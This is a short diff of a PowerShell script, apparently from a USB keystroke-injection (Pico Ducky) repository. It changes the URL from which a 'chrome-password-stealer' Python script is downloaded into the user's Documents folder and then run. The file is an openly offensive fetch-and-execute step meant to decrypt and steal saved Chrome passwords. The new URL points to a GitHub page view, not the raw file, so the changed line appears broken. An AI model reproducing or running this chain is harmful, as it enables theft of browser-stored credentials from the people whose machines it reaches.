@@ -16,7 +16,7 @@ if (Test-Path -Path $filePath -PathType Leaf) {
 
 py -m pip install pycryptodomex pywin32
 
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Pico-Ducky-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
+Invoke-WebRequest -Uri https://github.com/simen64/Pico-HID-Scripts/blob/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
 
 & $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
 
